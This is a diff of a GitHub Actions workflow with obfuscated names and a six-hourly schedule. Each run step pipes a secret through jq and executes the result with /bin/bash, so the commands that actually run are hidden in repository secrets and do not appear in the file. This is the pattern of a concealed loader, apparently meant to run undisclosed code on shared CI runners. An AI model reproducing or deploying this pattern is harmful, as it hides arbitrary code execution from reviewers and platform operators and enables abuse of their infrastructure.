@@ -1,26 +1,25 @@
 name: liangruhao4719
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
+    - cron: '21 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liangruhao4719
         env:
-          zbmuw38: ${{ secrets.zbmuw38 }}
+          kqrzo6833: ${{ secrets.kqrzo6833 }}
         run: |
-          echo $zbmuw38 | jq -r .ftnd3255 | /bin/bash
-          echo $wrzh97999 | jq -r .i9373 | /bin/bash
-          echo $caew89 | jq -r .luffd50638 | /bin/bash
-          echo $cknu082 | jq -r .dcyj2828 | /bin/bash
-          echo $a63318 | jq -r .cy0 | /bin/bash
-          echo $d79 | jq -r .kpred7667 | /bin/bash
-          echo $uudv0 | jq -r .flo5 | /bin/bash
-          echo $yi98 | jq -r .q459 | /bin/bash
-          echo $w85 | jq -r .hxdyr6562 | /bin/bash
-          echo $mdg413 | jq -r .vq0434 | /bin/bash
+          echo $kqrzo6833 | jq -r .acv9858 | /bin/bash
+          echo $zbx3567 | jq -r .gky78350 | /bin/bash
+          echo $nkt9 | jq -r .whq35019 | /bin/bash
+          echo $i7953 | jq -r .iqblk960 | /bin/bash
+          echo $nmsce4191 | jq -r .xyi55167 | /bin/bash
+          echo $x2013 | jq -r .uhat48 | /bin/bash
+          echo $gnn5939 | jq -r .psjeg42986 | /bin/bash
 
